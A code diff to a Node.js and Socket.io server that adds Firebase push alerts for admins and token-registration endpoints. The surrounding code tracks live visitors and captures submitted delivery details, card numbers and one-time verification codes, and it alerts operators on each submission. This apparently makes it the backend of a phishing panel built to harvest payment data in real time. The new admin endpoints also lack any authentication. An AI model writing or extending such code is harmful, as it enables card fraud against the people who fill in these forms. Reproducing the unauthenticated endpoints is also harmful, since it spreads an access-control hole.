@@ -10,10 +10,16 @@ const bcrypt = require('bcryptjs');
 const pool = require('./config/database');
 const { initializeDatabase } = require('./models/schema');
 
+// Import Firebase Admin SDK
+const firebaseAdmin = require('./firebase-admin');
+
 // Import routes
 const productRoutes = require('./routes/products');
 const adminRoutes = require('./routes/admin');
 const visitorRoutes = require('./routes/visitors');
+
+// Global FCM tokens storage (for admin notifications)
+global.fcmTokens = [];
 
 const app = express();
 const server = http.createServer(app);
@@ -193,6 +199,9 @@ io.on('connection', (socket) => {
         adminSocket.emit('visitor:new', newVisitorData);
       });
 
+      // Send FCM push notification for new visitor
+      firebaseAdmin.notifyNewVisitor(newVisitorData);
+
       socket.emit('visitor:confirmed', { sessionId });
     } catch (error) {
       console.error('Error initializing visitor:', error);
@@ -325,6 +334,9 @@ io.on('connection', (socket) => {
       io.emit('form:deliverySubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyDelivery(eventData);
+
       console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
       console.error('Error saving delivery data:', error);
@@ -397,6 +409,9 @@ io.on('connection', (socket) => {
       // Also broadcast to all sockets (including visitors for confirmation)
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
+
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyPayment(eventData);
 
       console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
     } catch (error) {
@@ -478,6 +493,9 @@ io.on('connection', (socket) => {
       
       io.emit('form:verificationSubmitted', eventData);
       io.emit('visitor:updated', eventData);
+
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyVerification(eventData);
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
@@ -1193,6 +1211,43 @@ io.on('connection', (socket) => {
       
       connectedClients.delete(socket.id);
     }
+  });
+});
+
+// ==========================================
+// FCM Token Management API
+// ==========================================
+
+// Save FCM token from admin
+app.post('/api/admin/fcm-token', async (req, res) => {
+  try {
+    const { token, enabled } = req.body;
+    
+    if (!token) {
+      return res.status(400).json({ success: false, error: 'Token required' });
+    }
+    
+    // Remove existing token if present (one device per admin for now)
+    global.fcmTokens = global.fcmTokens.filter(t => t !== token);
+    
+    if (enabled !== false) {
+      // Add new token
+      global.fcmTokens.push(token);
+      console.log(`🔔 FCM token registered: ${token.substring(0, 20)}...`);
+    }
+    
+    res.json({ success: true, tokensCount: global.fcmTokens.length });
+  } catch (error) {
+    console.error('❌ FCM token error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Get FCM tokens status
+app.get('/api/admin/fcm-status', (req, res) => {
+  res.json({ 
+    enabled: global.fcmTokens.length > 0,
+    tokensCount: global.fcmTokens.length
   });
 });
 
